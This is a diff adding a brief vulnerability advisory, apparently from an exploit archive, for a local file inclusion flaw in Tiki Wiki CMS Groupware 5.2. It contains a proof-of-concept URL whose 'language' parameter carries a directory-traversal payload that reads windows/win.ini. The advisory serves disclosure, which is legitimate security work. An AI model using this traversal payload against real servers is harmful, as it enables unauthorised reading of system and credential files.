@@ -1,0 +1,21 @@
+------------------------------------------------------------------------
+Software................Tiki Wiki CMS Groupware 5.2
+Vulnerability...........Local File Inclusion
+Download................htp://www.tiki.org
+Release Date............9/24/2010
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................John Leitch
+Site....................http://www.johnleitch.net/
+Email...................john.leitch5@gmail.com
+------------------------------------------------------------------------
+
+--Description--
+
+A local file inclusion vulnerability in Tiki Wiki CMS Groupware 5.2
+can be exploited to include arbitrary files.
+
+
+--PoC--
+
+http://localhost/tiki-5.2/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini
